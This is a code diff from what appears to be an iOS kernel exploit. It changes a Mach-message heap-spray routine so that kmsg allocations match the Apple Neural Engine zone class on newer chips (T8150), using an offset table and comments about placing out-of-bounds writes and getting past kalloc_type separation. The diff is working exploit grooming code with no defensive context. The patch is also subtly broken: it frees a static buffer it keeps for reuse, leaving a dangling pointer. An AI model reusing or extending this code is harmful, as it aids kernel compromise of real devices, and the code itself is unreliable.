@@ -169,14 +169,32 @@ static mach_port_t p099_make_port(void) {
    would corrupt into descriptor tampering. Inline payloads are plain
    kalloc.3072 data: the OOB lands in payload bytes we can diff. */
 static BOOL p099_send_msg(mach_port_t port, uint32_t index, uint32_t role) {
-    p099_msg_t *msg = calloc(1, sizeof(p099_msg_t));
+    /* T8150-aware sizing (note 189): kmsg must size to the ane element class
+       or kalloc_type sequesters kmsg vs IOMallocType. A14 0x820 table -> the
+       existing p099_msg_t shape; T8150 0x10b8 -> msgh_size = class - 0x24. */
+    uint32_t tbl = 0x820u;
+    const LabOffTab *poff = LabOff();
+    if (poff && poff->ane_table_size) tbl = poff->ane_table_size;
+    static p099_msg_t *big_msg = NULL;
+    static uint32_t big_tbl = 0;
+    if (tbl != 0x820u) {
+        if (!big_msg || big_tbl != tbl) {
+            free(big_msg);
+            big_msg = calloc(1, sizeof(p099_msg_t) - 0x24 + tbl); /* oversize tail, safe */
+            big_tbl = tbl;
+        }
+        if (!big_msg) return NO;
+    }
+    p099_msg_t *msg = (tbl == 0x820u) ? calloc(1, sizeof(p099_msg_t)) : big_msg;
     if (!msg) return NO;
+    mach_msg_size_t send_sz = (tbl == 0x820u) ? (mach_msg_size_t)sizeof(p099_msg_t)
+                                              : (mach_msg_size_t)(tbl - 0x24);
     msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
-    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(p099_msg_t);
+    msg->hdr.msgh_size = (tbl == 0x820u) ? (mach_msg_size_t)sizeof(p099_msg_t) : send_sz;
     msg->hdr.msgh_remote_port = port;
     msg->hdr.msgh_id = (mach_msg_id_t)(0x58590000u | ((role & 0xffu) << 8) | (index & 0xffu));
     p099_fill_payload(msg->bytes, index, role);
-    kern_return_t kr = mach_msg(&msg->hdr, MACH_SEND_MSG, sizeof(p099_msg_t),
+    kern_return_t kr = mach_msg(&msg->hdr, MACH_SEND_MSG, ((msg->hdr.msgh_size) ? msg->hdr.msgh_size : (mach_msg_size_t)sizeof(p099_msg_t)),
                                 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
     free(msg);
     return kr == MACH_MSG_SUCCESS;
